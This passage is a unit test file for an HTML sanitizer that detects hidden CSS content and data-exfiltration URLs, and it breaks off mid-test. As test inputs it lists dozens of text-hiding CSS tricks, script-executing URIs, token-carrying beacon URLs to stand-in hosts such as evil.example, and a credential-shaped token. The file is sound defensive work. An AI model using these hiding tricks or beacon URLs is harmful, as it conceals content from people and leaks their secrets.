/**
 * Exact-verdict unit tests for the HTML layer (Layers 2 & 3). Pins the exact
 * operators/boundaries of each pure helper so a flipped comparison or blanked
 * branch is caught, and drives one case per REPORTED_TAGS entry from the SSOT.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import fc from "fast-check";

import { fcRunOptions } from "./test-helpers.mjs";
import {
  sanitizeHtml,
  detectExfil,
  isHiddenStyle,
  isHiddenElement,
  isHiddenOpen,
  checkExfilUrl,
  looksLikeHtmlSource,
  closingTagName,
  spliceRanges,
  scanHtmlFragment,
  urlHost,
  REPORTED_TAGS,
  COMMENT_PLACEHOLDER,
  HIDDEN_PLACEHOLDER,
  UNPARSEABLE_PLACEHOLDER,
  DATA_URI_LENGTH_THRESHOLD,
} from "../src/html.mjs";
import { sanitize } from "../src/index.mjs";

const applyHtml = (text) => sanitizeHtml(text)?.text ?? text;

// SSOT for the hidden-style unit cases: one row per hiding technique (and per
// near-boundary visible counter-example). Driving the loop from this array
// means adding a technique without a row fails to register a case. Each
// `expectedHidden` is the exact verdict for that `style`.
const HIDDEN_STYLE_CASES = [
  // ── display / visibility ──
  ["display:none", true],
  ["DISPLAY:NONE", true],
  ["display:none !important", true],
  ["display:block", false],
  ["visibility:hidden", true],
  ["visibility:collapse", true], // collapse hides like hidden (bug: only hidden checked)
  ["visibility:visible", false],
  // ── opacity (epsilon, not exact 0) ──
  ["opacity:0", true],
  ["opacity:0.001", true], // near-zero (bug: only ===0 caught)
  ["opacity:0.009", true],
  ["opacity:0.15", false], // dim but readable — epsilon must stay tight
  ["opacity:0.5", false],
  ["opacity:1", false],
  ["opacity:5", false],
  ["opacity:-1", true], // CSS clamps to [0,1]; any negative is fully transparent
  ["opacity:-0.5", true], // (bug: Math.abs mapped -1→1, read as visible)
  ["opacity:-0.001", true],
  ["opacity:0.9", false], // ordinary near-opaque value stays visible
  ["opacity:0%", true], // valid percentage: 0% is fully transparent
  ["opacity:0.5%", true], // 0.5% = 0.005 fraction, effectively invisible
  ["opacity:50%", false], // valid percentage: half-opaque, visible
  ["opacity:0px", false], // invalid unit — a browser ignores it, element stays visible
  ["opacity:0em", false], // invalid unit — fail open (was parseFloat'd to 0 → over-flagged)
  // ── CSS-escape terminators normalized to LF (FF/CR/CRLF), as a browser does
  //    before consuming one whitespace as the escape terminator; `\6e<ws>…\65`
  //    spells `none`, so the hidden element must be detected ──
  ["display:\\6e \\6f \\6e \\65", true], // plain-space terminators (anchor)
  ["display:\\6e\\6f\\6e\\65", true], // FORM FEED terminators
  ["display:\\6e\r\\6f\r\\6e\r\\65", true], // CR terminators
  ["display:\\6e\r\n\\6f\r\n\\6e\r\n\\65", true], // CRLF terminators
  // ── percentage zero-alpha is transparent (CSS Color 4), like the bare-zero form ──
  ["color:rgb(0 0 0 / 0%)", true],
  ["color:rgba(0,0,0,0%)", true],
  ["color:rgb(0 0 0 / 50%)", false], // half-opaque percentage stays visible
  // ── filter:opacity in scientific notation (mirrors the transform exponent arm) ──
  ["filter:opacity(1e-3)", true], // ≈0 → invisible
  ["filter:opacity(1e3)", false], // 1000 → clamps visible
  // ── salvage splits on TOP-LEVEL ; only: a display:none inside a quoted value is
  //    part of that value, not a real declaration, so it must not over-splice ──
  ['x;content:"a;display:none;b"', false],
  // A backslash-escaped char inside a quoted value: the escape must not end the
  // string early, so the top-level `;` splitter keeps the value intact (and the
  // `\`-then-char escape branch is exercised).
  ['x;content:"a\\b;c"', false],
  ["x;font-family:'a;b'", false], // single-quoted value: `;` inside is not a separator
  ["x;background:url(a;b)", false], // `;` inside url()/parens is not a separator
  ["x;background:url(a;display:none;b)", false], // display:none inside url() is NOT a real decl
  // css-tree substrate: a comment between the colon and value is stripped, so a
  // browser still applies the declaration (the hand-rolled parser choked on it).
  ["display:/* c */none", true],
  ["display:/* c */block", false], // same path, visible value stays visible
  // css-tree substrate: robust function-arg + var() tokenization keeps these
  // unresolvable values failing OPEN instead of being mis-read as offscreen/zero.
  ["transform:scale(calc(0.0001))", false], // calc scale factor is unresolvable
  ["position:absolute;left:var(--x)", false], // var() offset resolves via cascade
  ["x;a:b)c", false], // an unbalanced `)` at top level must not underflow the depth
  // ── zero / near-zero size (epsilon) ──
  // `height`/`width` alone (no `overflow:hidden`) are deliberately NOT
  // standalone-hidden: the default `overflow:visible` still paints
  // overflowing children, so the element stays visible (precision fix).
  ["height:0", false],
  ["width:0", false],
  ["overflow:hidden;height:0", true], // zero box + overflow:hidden together hide
  ["overflow:hidden;width:0", true],
  ["overflow:visible;height:0", false], // explicit visible overflow: not hidden
  ["font-size:0", true],
  ["font-size:0.0001px", true], // sub-epsilon (bug: required exact 0)
  ["font-size:0.005em", true],
  ["height:5px", false],
  ["font-size:11px", false],
  ["font-size:0.9em", false], // ordinary relative size
  ["font-size:14px", false],
  // ── `font` SHORTHAND size (bug: only the font-size longhand was checked) ──
  ["font:0px/1 serif", true], // size 0 via shorthand with line-height
  ["font:0.005em/1 serif", true], // sub-epsilon shorthand size
  ["font:italic bold 0px/1.4 Arial", true], // size token mid-shorthand
  ["font:16px/1.5 serif", false], // ordinary size — visible
  ["font:0vw serif", false], // vw is not a font-size length unit here — fail open (matches the string parser)
  ["font:italic bold 14px Georgia", false], // no line-height, normal size
  ["font:bold 100 12px sans-serif", false], // weight numbers are not the size token
  // ── positioned offscreen, any unit ──
  ["position:absolute;left:-9999px", true],
  ["position:fixed;top:-10000px", true],
  ["position:fixed;right:-9999px", true],
  ["position:absolute;bottom:-9999px", true],
  ["position:absolute;left:-901px", true],
  ["position:absolute;left:-100vw", true], // a full viewport-width fully clears the screen
  ["position:absolute;left:-100%", true],
  ["clip:rect(0,0,0,0);position:absolute", true],
  // clip: rect(top,right,bottom,left) hides only when the window collapses to
  // ~zero AREA (width right-left or height bottom-top near zero) — parsing all
  // four edges, not just the first (bug: `rect(0,…)` spliced a visible window).
  ["clip:rect(0px,100px,100px,0px);position:absolute", false], // 100x100 visible window
  ["position:absolute;clip:rect(1,1,1,1)", true], // degenerate 0x0 window (the sr-only clip hack)
  ["position:absolute;clip:rect(10px,10px,20px,10px)", true], // right==left → zero width
  ["position:absolute;clip:rect(0px,50px,0px,0px)", true], // bottom==top → zero height
  ["position:absolute;clip:rect(10%,20%,10%,20%)", true], // percentage edges: top==bottom → zero height (same as legacy string parser)
  ["position:absolute;clip:rect(auto,auto,auto,auto)", false], // auto edges unresolvable — fail open
  ["position:absolute;clip:rect(0px,5em,1em,0px)", false], // mismatched-unit pairs — fail open
  ["position:absolute;clip:rect(0,0,0)", false], // only 3 edges — malformed, fail open
  ["position:absolute;clip:auto", false], // truthy clip with no rect() — fail open (isClipRectHidden !rect)
  ["position:absolute;left:10px", false],
  ["position:absolute;left:-900px", false],
  ["position:absolute;left:-10px", false],
  ["position:absolute;left:-5px", false], // small negative is ordinary layout
  ["position:absolute;left:-5vw", false],
  ["position:absolute;left:-50vw", false], // half-shift leaves it on screen (precision: was over-flagged)
  ["position:absolute;left:-50%", false], // half-shift leaves it on screen
  ["position:absolute;left:-10%", false],
  ["position:absolute;top:-1px", false],
  ["position:absolute;left:calc(-100vw)", false], // unresolvable calc fails open (precision)
  ["position:absolute;left:calc(100% - 5px)", false], // ordinary in-flow calc must not splice
  ["position:static;left:-9999px", false],
  // ── relative / sticky offscreen (bug: only absolute/fixed were gated) ──
  ["position:relative;left:-9999px", true],
  ["position:sticky;top:-10000px", true],
  ["position:relative;left:-5px", false], // small relative nudge stays on screen
  ["position:relative;clip:rect(1,1,1,1)", false], // `clip` ignores relative boxes — fail open
  ["position:absolute;left:auto", false], // non-length offset is not offscreen
  ["position:absolute;left:-1000", false], // unitless nonzero length is INVALID CSS; browser drops it, fails open
  ["position:absolute;left:-9999", false], // same, larger magnitude
  ["position:absolute;left:-9999deg", false], // a non-length unit (deg) is invalid for an offset; browser drops it, fails open
  // ── text-indent offscreen ──
  ["text-indent:-9999px", true],
  ["text-indent:-100vw", true],
  ["text-indent:-900px", false],
  ["text-indent:-0.5em", false], // ordinary hanging indent is not offscreen
  ["text-indent:calc(2em - 1px)", false], // calc indent fails open
  ["text-indent:-9999", false], // unitless nonzero — invalid CSS, fails open (was over-flagged)
  // ── overflow + zero box ──
  ["overflow:hidden;max-width:0", true],
  ["overflow:hidden;max-height:0", true],
  ["overflow:visible;max-width:0", false],
  ["overflow:hidden;max-width:5px", false],
  // near-zero (epsilon band), not exact 0 (bug: used parseFloat(value)===0)
  ["overflow:hidden;height:0.0001px", true],
  ["overflow:hidden;width:0.005em", true],
  ["overflow:hidden;height:5px", false], // real height — visible
  // ── clip-path (fractional percentages) ──
  ["clip-path:inset(50%)", true],
  ["clip-path:inset(100%)", true],
  ["clip-path:inset(99.9%)", true], // fractional (bug: regex missed it)
  ["clip-path:circle(0)", true],
  ["clip-path:none", false],
  ["clip-path:circle(50%)", false],
  ["clip-path:inset(10%)", false], // partial inset still shows content
  ["clip-path:inset(10px)", false],
  ["clip-path:inset(50% 0 0 0)", false], // only the top half is clipped — bottom stays visible
  ["clip-path:inset(50% 50%)", true], // 2-value: all four edges resolve to 50%
  ["clip-path:inset(60% 70% 80% 90%)", true], // 4-value, every edge >=50%
  ["clip-path:inset(50% 50% 50% 10%)", false], // one open edge (left 10%) keeps content visible
  ["clip-path:inset(200px)", false], // length inset cannot be proven to collapse — fail open
  ["clip-path:inset(50% round 10px)", true], // `round <radius>` suffix ignored
  ["clip-path:inset()", false], // no edges — fail open
  ["clip-path:inset(1% 2% 3% 4% 5%)", false], // too many edges — malformed, fail open
  // ── transform: scale / rotate edge-on / translate offscreen ──
  ["transform:scale(0)", true],
  ["transform:scale( 0)", true],
  ["transform:scale(0.0001)", true], // near-zero scale (bug: exact 0 only)
  ["transform:scale(1e-3)", true], // exponent (bug: capture stopped at `e`, read scale(1))
  ["transform:scale(1E-3)", true], // uppercase exponent
  ["transform:scale(-1e-4)", true], // signed exponent magnitude is near-zero
  ["transform:translateX(-1e4px)", true], // -10000px offscreen via exponent
  ["transform:scale(1e3)", false], // exponent enlarges — visible, not near-zero
  ["transform:scale(1e0)", false], // 1e0 === 1, visible
  ["transform:matrix(0,0,0,0,0,0)", true],
  // Multi-arg Y-axis collapse (bug: only the FIRST scale factor was tested, so
  // scaleX=1 masked a scaleY=0).
  ["transform:scale(1,0)", true], // Y collapsed, X visible
  ["transform:scale(0,1)", true], // X collapsed
  ["transform:scale3d(1,0,1)", true], // Y collapsed in 3d
  ["transform:matrix(1,0,0,0,0,0)", true], // d (scaleY) = 0
  ["transform:matrix3d(1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1)", true], // m22 (scaleY) = 0
  ["transform:scale(1,1)", false], // both axes visible — not hidden
  // matrix3d IDENTITY must NOT read as hidden: m14 (index 3) is legitimately 0,
  // so a naive "index 3 is scaleY" check would false-positive here.
  ["transform:matrix3d(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1)", false],
  ["transform:rotateY(90deg)", true], // edge-on (bug: not detected)
  ["transform:rotateX(90deg)", true],
  ["transform:rotateY(-90deg)", true],
  ["transform:rotateX(270deg)", true],
  // ── rotate angle UNITS beyond deg + leading `+` (bug: hardcoded `deg`/`-?`) ──
  ["transform:rotateX(0.25turn)", true], // 0.25turn === 90deg
  ["transform:rotateY(100grad)", true], // 100grad === 90deg
  ["transform:rotateX(1.5707963rad)", true], // ≈ π/2 rad === 90deg
  ["transform:rotateY(+90deg)", true], // leading + sign
  ["transform:rotateX(0.5turn)", false], // 180deg — in-plane, still visible
  ["transform:rotateY(50grad)", false], // 45deg, projects area
  ["transform:rotateX(90)", false], // unitless angle is invalid CSS — browser drops it, visible
  ["transform:translateX(-9999px)", true], // offscreen via transform (bug: position-only)
  ["transform:translatex(-100vw)", true], // a full viewport-width clears the screen
  ["transform:translate(0,-9999px)", true], // Y axis offscreen, X=0 (second arg was ignored)
  ["transform:translate(-9999px,0)", true], // X axis offscreen
  ["transform:translate(0,0)", false], // neither axis shifts
  ["transform:translate(5px,-10px)", false], // small two-axis shift stays on screen
  ["transform:translatex(-50vw)", false], // half-shift stays partly visible (precision)
  // A `%` translate is relative to the element's OWN size, not the viewport, so
  // it can't be judged offscreen without layout — fail OPEN (bug: `%` was read
  // as a viewport unit and spliced a right-aligned popover).
  ["transform:translateX(-100%)", false], // element-relative %, not offscreen
  ["transform:translateY(-100%)", false],
  ["transform:translate(-100%,0)", false],
  ["transform:translate(0,-999%)", false], // large % is still element-relative
  ["transform:translateX()", false], // empty translate arg — isOffscreenTranslate !value early return
  ["position:absolute;left:100%;transform:translateX(-100%)", false], // right-aligned popover, on screen
  ["transform:scale(0.5)", false],
  ["transform:scale(0.8)", false], // mild shrink stays readable
  ["transform:translatex(5px)", false],
  ["transform:rotate(90deg)", false], // 2D in-plane spin stays visible
  ["transform:rotateZ(90deg)", false],
  ["transform:rotateY(45deg)", false],
  ["transform:rotateY(89deg)", false], // near-edge-on but still projects area
  // ── same-color text/background across notations ──
  ["color:transparent", true],
  ["color:white;background-color:white", true],
  ["color:#fff;background:#fff", true],
  ["color:#FFFFFF;background-color:white", true], // hex vs named (bug: notation mismatch)
  ["color:rgb(255,255,255);background:white", true], // rgb vs named
  ["color:white;background-color:rgb(255, 255, 255)", true],
  ["color:#000;background:rgb(0,0,0)", true], // black on black
  // ── non-primary named colors (bug: table had only white/black/red) ──
  ["color:blue;background:blue", true], // any two identical resolvable names compare
  ["color:teal;background-color:teal", true],
  ["color:cyan;background:aqua", true], // cyan and aqua are the same #00ffff
  ["color:rebeccapurple;background-color:rebeccapurple", true],
  ["color:blue;background:white", false], // distinct named colors — visible text (precision)
  ["color:navy;background:blue", false], // near but not equal — visible
  // ── background-image layer defeats the same-color hide (bug: background-color
  //    longhand path ignored a co-declared background-image, splicing visible
  //    text painted over the image) ──
  ["color:#fff;background-color:#fff;background-image:url(x.png)", false],
  [
    "color:#fff;background-color:#fff;background-image:linear-gradient(#000,#111)",
    false,
  ],
  ["color:#fff;background:#fff url(x.png)", false], // shorthand image layer (already handled)
  ["color:#fff;background-color:#fff;background-image:none", true], // explicit none is not a layer — still hidden
  // ── -webkit-text-fill-color overrides `color` for the painted glyphs (bug:
  //    same-color branch compared the raw `color`, not the effective fill) ──
  ["color:#fff;-webkit-text-fill-color:#000;background:#fff", false], // black text on white — visible
  ["color:#000;-webkit-text-fill-color:#fff;background:#fff", true], // white fill on white — hidden
  // CSS Color 4 notations canonicalize for the same-color compare.
  ["color:rgb(255 255 255);background:white", true], // space-separated rgb
  ["color:rgb(100% 100% 100%);background:#fff", true], // percentage channels
  ["color:hsl(0 0% 100%);background-color:white", true], // hsl white on white
  ["color:hsl(0, 0%, 0%);background:#000", true], // legacy-comma hsl black on black
  ["color:rgb(0 0 0 / 0);background:white", true], // zero alpha = transparent text
  ["color:rgba(1,2,3,0);background:white", true], // legacy comma 4th-channel zero alpha
  ["color:rgba(255,255,255,0.5);background-color:white", true], // non-zero alpha ignored for the hex compare
  ["color:hsl(0 0% 100%);background:hsl(0 0% 50%)", false], // distinct hsl lightness
  // hsl hue sectors (each 60° arc of the conversion) as same-color hides.
  ["color:hsl(90 100% 50%);background-color:hsl(90 100% 50%)", true],
  ["color:hsl(150 100% 50%);background-color:hsl(150 100% 50%)", true],
  ["color:hsl(210 100% 50%);background-color:hsl(210 100% 50%)", true],
  ["color:hsl(270 100% 50%);background-color:hsl(270 100% 50%)", true],
  ["color:hsl(330 100% 50%);background-color:hsl(330 100% 50%)", true],
  // hsl hue angle units and bare-number saturation/lightness (CSS Color 4).
  ["color:hsl(200grad 100% 50%);background-color:hsl(0.5turn 100% 50%)", true], // 200grad === 0.5turn === 180deg
  ["color:hsl(3.14159265rad 100 50);background-color:hsl(180 100% 50%)", true], // π rad === 180deg; bare-number s/l
  ["color:rgb(none 0 0);background-color:rgb(none 0 0)", false], // unresolvable channel — fail open (not concrete)
  ["color:hsl(0 nope 50%)", false], // unresolvable saturation — fail open
  ["color:hsl(nope 100% 50%)", false], // unresolvable hue — fail open
  ["color:rgb(1 2 3 / 4 / 5)", false], // two slashes — malformed, fail open
  ["color:rgb(1 2)", false], // wrong channel count — fail open
  ["color:red", false],
  ["color:white", false], // color alone, no background — never infer the page bg
  ["color:white;background:#fefefe", false], // near-white but not equal
  ["color:#777;background:#888", false], // distinct grays
  ["color:white;background-color:black", false],
  ["background-color:white", false], // color absent — not same-color
  ["color:rgb(0,0,0);background:rgb(255,255,255)", false],
  // ── image-layer background: same flat color is not provably the backdrop ──
  ["color:white;background:#fff url(x) no-repeat", false], // url image can paint over the text — fail open
  ["color:#000;background:rgb(0,0,0) url(x)", false], // image layer, fail open
  ["color:white;background:#fff linear-gradient(#fff,#000)", false], // gradient layer, fail open
  // ── gradient-clipped / text-filled heading is visible despite transparent color ──
  ["color:transparent;-webkit-background-clip:text", false],
  ["color:transparent;background-clip:text", false],
  ["color:transparent;-webkit-text-fill-color:#111", false], // fill color overrides transparent
  ["color:transparent;-webkit-text-fill-color:transparent", true], // fill also transparent — still hidden
  // ── -webkit-text-stroke paints a visible outline despite transparent fill ──
  ["color:transparent;-webkit-text-stroke:1px black", false], // outlined glyphs are visible
  ["color:transparent;-webkit-text-stroke:2px #111", false], // hex stroke color, visible
  ["color:transparent;-webkit-text-stroke-color:black", false], // longhand stroke color
  ["color:transparent;-webkit-text-stroke:1px transparent", true], // stroke also transparent — still hidden
  ["color:transparent;-webkit-text-stroke:1px", true], // width only (currentColor=transparent) — still hidden
  // ── unresolved color tokens: can't prove same-color, so fail open ──
  ["color:var(--fg);background-color:var(--fg)", false], // same var, but resolves via cascade — not provably equal
  ["color:inherit;background:inherit", false], // inherit color != inherit background-color
  ["color:currentColor;background-color:currentColor", false],
  ["color:var(--fg);background:#fff", false], // one side unresolved
  // ── content-visibility ──
  ["content-visibility:hidden", true],
  ["content-visibility:auto", false], // perf hint; content stays visible
  ["content-visibility:visible", false],
  // ── filter: opacity(0) (number or percentage) ──
  ["filter:opacity(0)", true],
  ["filter:opacity(0%)", true],
  ["filter:opacity(0.005)", true], // sub-epsilon fraction
  ["filter:opacity(0.5%)", true], // 0.5% = 0.005 fraction, effectively invisible
  ["filter:blur(2px) opacity(0)", true], // opacity(0) anywhere in the list hides
  ["filter:opacity()", false], // no amount — unresolvable, fail open
  ["filter:opacity(0.5)", false], // half-transparent stays readable
  ["filter:opacity(50%)", false], // 50% = 0.5 fraction, visible
  ["filter:opacity(1)", false],
  ["filter:blur(2px)", false], // no opacity function — visible
  ["filter:none", false],
  // ── degenerate / invalid input ──
  ["", false],
  ["a{b:c}", false],
  // ── per-declaration salvage on parse failure ──
  ["x;display:none", true], // one invalid decl must not blank the whole style (bypass fix)
  ["display:none;x", true], // invalid decl trailing the valid one is salvaged too
  ["x;;display:none", true], // empty segment from `;;` is skipped, rest salvaged
  ["bad!!!;color:red", false], // salvage must not manufacture a false positive
  ["bad!!!;x also bad", false], // no declaration salvages at all — fails open
  // ── CSS-escaped keyword decoding ──
  ["display:no\\6e e", true], // `\6e` decodes to 'n' + space terminator consumed
  ["display:\\64 isplay-never-a-real-value", false], // decodes to a nonsense keyword, stays visible
  ["display:\\62 lock", false], // `\62` decodes to 'b' -> "block", correctly visible after decode
  ["visibility:hi\\64 den", true], // `\64` decodes to 'd' -> "hidden"
  // `!important` is stripped AFTER escape-decoding, so an escaped spelling of the
  // flag is caught (bug: raw-stripping missed `!\69mportant`, leaving the value
  // `none!important` != `none`, so hidden content leaked).
  ["display:none!\\69mportant", true], // `\69` -> 'i' -> "none!important" -> stripped -> "none"
  ["display:none !\\69mportant", true], // with a space before the escaped flag
  ["display:block!\\69mportant", false], // decodes to "block!important" -> stripped -> "block", visible
  ["visibility:hi\\64 den!important", true], // escaped value AND a plain important flag
  // ── raw fallback for declarations the declaration parser cannot read at all ──
  // An escape in the PROPERTY NAME is valid CSS a browser applies, but a parse
  // error to the declaration parser even in isolation; the raw first-colon
  // fallback must still detect it (a hidden-content bypass otherwise).
  ["\\64 isplay:none", true], // `\64` -> 'd': browser reads `display:none`
  ["\\76 isibility:hidden", true], // `\76` -> 'v': browser reads `visibility:hidden`
  ["color:red;\\64 isplay:none", true], // valid decl first, escaped hider second
  ["x;\\64 isplay:none", true], // junk decl plus escaped hider
  ["\\64 isplay:block", false], // escaped property, visible value — stays visible
  // Parse-breaking styles a browser would NOT hide must stay fail-open: the
  // fallback's ident gate rejects anything a browser's tokenizer rejects.
  ["/*x display:none", false], // unterminated comment swallows everything
  ["dis play:none", false], // space in property name — invalid declaration
  ["a{display:none", false], // brace junk in property name — invalid
  ["\\3a :none", false], // property decodes to ':', not an ident
  // ── invalid escaped codepoints (spec: decode to U+FFFD, never throw) ──
  ["display:\\0", false], // codepoint 0 is invalid
  ["display:\\d800", false], // a surrogate half is invalid
  ["display:\\ffffff", false], // past the Unicode maximum (0x10FFFF)
];

// Negative corpus for the raw-declaration fallback: realistic legitimate
// styles — including parse-breaking ones the declaration parser rejects — must
// produce ZERO hidden verdicts, or the fallback would splice real content
// (precision-over-recall doctrine).
const LEGIT_STYLE_CORPUS = [
  "color: #333; font-size: 14px; line-height: 1.5",
  "display: flex; align-items: center; gap: 8px",
  "background: url(https://example.com/a.png) no-repeat; padding: 1em",
  "font-family: 'Helvetica Neue', Arial, sans-serif; font-weight: 600",
  "--brand-color: #0af; color: var(--brand-color)",
  "-webkit-transition: opacity 0.3s; opacity: 0.9",
  "margin:0 auto;width:min(100%, 60ch)",
  "content: 'a;b'; quotes: '“' '”'",
  // Parse-breaking but benign: the fallback must not resurrect these.
  "color: red /* trailing unterminated comment",
  "font size: 12px; color: blue",
  "a{color:red}",
  "{}; color: green",
  "12px:display",
];

describe("unit: isHiddenStyle exact verdicts", () => {
  for (const style of LEGIT_STYLE_CORPUS)
    it(`negative corpus: leaves ${JSON.stringify(style)}`, () =>
      assert.equal(isHiddenStyle(style), false));

  for (const [style, expectedHidden] of HIDDEN_STYLE_CASES)
    it(`${expectedHidden ? "flags" : "leaves"} ${JSON.stringify(style)}`, () =>
      assert.equal(isHiddenStyle(style), expectedHidden));

  // A CSS value matching an Object.prototype member must not poison the named-
  // color lookup (`in` would return an inherited object/function); it is just an
  // unknown color and the declaration is visible.
  for (const proto of [
    "__proto__",
    "constructor",
    "toString",
    "hasOwnProperty",
  ])
    it(`returns false (not a poisoned non-boolean) for color:${proto}`, () =>
      assert.equal(isHiddenStyle(`background:${proto}`), false));
});

describe("unit: isHiddenElement exact verdicts", () => {
  const elem = (tagName, properties = {}) => ({
    type: "element",
    tagName,
    properties,
  });
  it("ignores a non-element node (comments are handled separately)", () => {
    assert.equal(isHiddenElement({ type: "comment" }), false);
    assert.equal(isHiddenElement({ type: "text" }), false);
  });
  it("flags a hidden attribute", () =>
    assert.equal(isHiddenElement(elem("div", { hidden: "" })), true));
  it("does not flag hidden=null (the !== null half of the guard)", () =>
    assert.equal(isHiddenElement(elem("div", { hidden: null })), false));
  // aria-hidden removes an element only from the ACCESSIBILITY TREE — a
  // sighted human viewing the page still sees it (decorative icons,
  // icon-font glyphs, visible text duplicated for screen-reader dedup).
  // Splicing on it would delete content a human plainly sees, so it is
  // deliberately NOT a hiding signal here (precision fix).
  it("does not flag aria-hidden=true (visible on the rendered page)", () =>
    assert.equal(isHiddenElement(elem("span", { ariaHidden: "true" })), false));
  it("does not flag aria-hidden=false", () =>
    assert.equal(
      isHiddenElement(elem("span", { ariaHidden: "false" })),
      false,
    ));
  it("still flags aria-hidden=true when it ALSO carries a real hiding style", () =>
    assert.equal(
      isHiddenElement(
        elem("span", { ariaHidden: "true", style: "display:none" }),
      ),
      true,
    ));
  it("flags a hiding inline style", () =>
    assert.equal(
      isHiddenElement(elem("div", { style: "display:none" })),
      true,
    ));
  it("leaves a visible inline style (style && isHiddenStyle, not ||)", () =>
    assert.equal(
      isHiddenElement(elem("div", { style: "display:block" })),
      false,
    ));
  // One case per REPORTED_TAGS entry: scripting tags are reported, not hidden.
  for (const tag of REPORTED_TAGS) {
    it(`does NOT flag <${tag}> as hidden`, () =>
      assert.equal(isHiddenElement(elem(tag)), false));
  }
  it("leaves a benign element with no hiding signal", () =>
    assert.equal(isHiddenElement(elem("div", {})), false));
});

describe("unit: checkExfilUrl exact verdicts", () => {
  it("flags a non-keyword param holding a base64 blob (the + quantifier)", () =>
    assert.equal(
      checkExfilUrl("https://e.com/p?xyz=" + "A".repeat(44)),
      "suspicious query parameter",
    ));
  it("flags a {{template}} indicator", () =>
    assert.equal(
      checkExfilUrl("https://e.com/p?note={{SECRET}}"),
      "suspicious query parameter",
    ));
  it("flags a url-safe base64 beacon whose scattered -/_ break every 40-char run (mixed case+digit)", () => {
    // 11 mixed-case+digit chunks joined by '-': longest alnum run is 10 (<40), so
    // the old contiguous-run gate missed it; total query < 200 so it is not
    // caught by the length rule either. The character-mix test flags it.
    const scattered = Array(11).fill("Ab3xYz9Qw2").join("-"); // 120 chars, run<=10
    assert.ok(scattered.length < 200 && !/[A-Za-z0-9]{40}/.test(scattered));
    assert.equal(
      checkExfilUrl("https://e.com/p?d=" + scattered),
      "suspicious query parameter",
    );
  });
  it("does NOT flag a long lowercase hyphenated word-slug (precision: no upper/digit)", () => {
    const slug = Array(11).fill("secrethistory").join("-"); // 153 chars, all [a-z-]
    assert.ok(slug.length < 200);
    assert.equal(checkExfilUrl("https://e.com/p?d=" + slug), null);
  });
  it("flags a query exactly past the length threshold (201), not at it (200)", () => {
    assert.equal(
      checkExfilUrl("https://e.com/p?n=" + "-".repeat(198)),
      "unusually long query string",
    );
    assert.equal(checkExfilUrl("https://e.com/p?n=" + "-".repeat(197)), null);
  });
  it("measures query length from the '?', not the whole URL (length - qIdx)", () =>
    assert.equal(
      checkExfilUrl("https://e.com/" + "a-".repeat(100) + "?q=hi"),
      null,
    ));
  it("flags userinfo with only a username (|| not &&)", () =>
    assert.equal(
      checkExfilUrl("https://user@evil.com/p"),
      "embedded credentials",
    ));
  it("flags a fragment past the threshold (201), not at it (200)", () => {
    assert.equal(
      checkExfilUrl("https://e.com/p#" + "A".repeat(200)),
      "unusually long fragment",
    );
    assert.equal(checkExfilUrl("https://e.com/p#" + "A".repeat(199)), null);
  });
  it("flags an active-content data: URI even with leading whitespace (\\s, not \\S)", () =>
    assert.equal(
      checkExfilUrl(" data:text/html,<b>x</b>"),
      "active-content data: URI",
    ));
  it("only treats a data: URI as such at the start (^ anchor), not mid-URL", () =>
    assert.equal(
      checkExfilUrl(
        "https://evil.example/x?token=" + "A".repeat(44) + "&u=data:text/html",
      ),
      "suspicious query parameter",
    ));
  it("flags an oversized data: payload strictly past the threshold, not at it", () => {
    const prefix = "data:application/octet-stream;base64,";
    const atLimit =
      prefix + "A".repeat(DATA_URI_LENGTH_THRESHOLD - prefix.length);
    assert.equal(atLimit.length, DATA_URI_LENGTH_THRESHOLD);
    assert.equal(checkExfilUrl(atLimit), null);
    assert.equal(
      checkExfilUrl(atLimit + "A"),
      "oversized inline data: payload",
    );
  });

  const b64 = "A".repeat(60);
  const hex64 = "a".repeat(64);
  it("flags a javascript: URI by its scheme, not its payload", () =>
    assert.equal(checkExfilUrl("javascript:alert(1)"), "script-executing URI"));
  it("flags a vbscript: URI with leading whitespace (\\s anchor)", () =>
    assert.equal(
      checkExfilUrl("  vbscript:Execute(x)"),
      "script-executing URI",
    ));
  // A browser strips tab/newline/CR from the URL before the scheme check, so a
  // `java\tscript:` (or newline/CR-split) navigates as `javascript:`.
  for (const [label, url] of [
    ["tab", "java\tscript:alert(1)"],
    ["newline", "java\nscript:alert(1)"],
    ["CR", "java\rscript:alert(1)"],
    ["vbscript newline", "vb\nscript:Execute(x)"],
    ["mid-scheme tab", "javascri\tpt:alert(1)"],
  ])
    it(`flags a ${label}-split script URI (browser strips \\t\\n\\r first)`, () =>
      assert.equal(checkExfilUrl(url), "script-executing URI"));
  it("flags a tab-split active-content data: URI (whitespace-stripped scheme)", () =>
    assert.equal(
      checkExfilUrl("data:text/ht\tml,<b>x</b>"),
      "active-content data: URI",
    ));
  it("flags a credential-shaped token value in a non-keyword param", () =>
    assert.equal(
      checkExfilUrl(
        "https://e.com/p?u=ghp_0a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7",
      ),
      "credential-shaped token in URL parameter",
    ));
  it("does not flag hyphenated prose containing a security keyword and a digit", () =>
    assert.equal(
      checkExfilUrl("https://e.com/p?redirect=login-authenticate-2024-relogin"),
      null,
    ));
  it("flags a base64 blob in a non-keyword query param (param walk)", () =>
    assert.equal(
      checkExfilUrl(`https://e.com/p?h=${b64}`),
      "suspicious query parameter",
    ));
  it("flags a hex blob in a fragment param (fragment walk)", () =>
    assert.equal(
      checkExfilUrl(`https://e.com/p?a=1#x=${hex64}`),
      "suspicious query parameter",
    ));
  it("flags a long base64 blob in a path segment (beacon w/o query)", () =>
    assert.equal(
      checkExfilUrl(`https://e.com/${"A".repeat(220)}`),
      "encoded data blob in path segment",
    ));
  it("does not flag a path segment at the threshold (128), only past it", () => {
    assert.equal(checkExfilUrl(`https://e.com/${"A".repeat(128)}`), null);
    assert.equal(
      checkExfilUrl(`https://e.com/${"A".repeat(129)}`),
      "encoded data blob in path segment",
    );
  });
  it("preserves a '+'-bearing base64 value (raw, not URLSearchParams-decoded)", () =>
    assert.equal(
      checkExfilUrl(`https://e.com/p?x=${"AB+/".repeat(15)}`),
      "suspicious query parameter",
    ));
  it("leaves a signed-CDN URL alone even though it is long with hex sig", () =>
    assert.equal(
      checkExfilUrl(
